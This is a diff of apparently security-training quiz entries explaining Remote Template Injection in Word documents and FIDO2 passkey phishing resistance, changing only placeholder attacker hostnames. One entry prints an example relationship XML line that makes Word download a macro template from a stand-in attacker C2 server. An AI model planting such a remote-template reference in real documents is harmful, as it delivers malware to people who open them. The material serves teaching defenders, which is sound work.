@@ -145,13 +145,13 @@ if (is_ip_in_kolkata_enterprise_range($client_ip)) {
   {
     question: "How does Remote Template Injection in Weaponized Word Documents execute Targeted Spear-Phishing Attacks?",
     shortAnswer: "The attached DOCX file contains no malicious code initially; when opened, it fetches a malicious Word macro template (`.dotm`) from an external attacker C2 server.",
-    explanation: "Perimeter antivirus scanners analyze static attachments. In Remote Template Injection, the `.docx` file contains an internal relationship XML file (`word/_rels/settings.xml.rels`) pointing to an external URL: `Target='https://c2.evil-host.in/template.dotm'`. The clean document passes all email gateway scanners. When the victim opens the document in Microsoft Word, Word dynamically downloads and executes the macro template from the C2 server.",
+    explanation: "Perimeter antivirus scanners analyze static attachments. In Remote Template Injection, the `.docx` file contains an internal relationship XML file (`word/_rels/settings.xml.rels`) pointing to an external URL: `Target='https://attacker-c2.net/template.dotm'`. The clean document passes all email gateway scanners. When the victim opens the document in Microsoft Word, Word dynamically downloads and executes the macro template from the C2 server.",
     hint: "Sending a blank picture frame that downloads the secret picture from the internet only when hung on the wall.",
     level: "expert",
     codeExample: `<!-- word/_rels/settings.xml.rels (Remote Template Injection) -->
 <Relationship Id="rId1" 
   Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" 
-  Target="https://c2.evil-gateway.in/malicious_template.dotm" 
+  Target="https://attacker-c2.net/malicious_template.dotm" 
   TargetMode="External" />`
   },
   {
@@ -285,7 +285,7 @@ certstream.listen_for_events(print_callback)`
     level: "expert",
     codeExample: `// FIDO2 Passkey Mathematical Origin Binding:
 // Target Domain   : kolkata-fintech.in (Has Registered Passkey Private Key)
-// Phishing Portal : kolkata-fintech.evil-host.in
+// Phishing Portal : kolkata-fintech.attacker-host.net
 // Result          : WebAuthn API Error: Origin mismatch! Private key refuses to sign! (0% Credential Leak)`
   },
   {
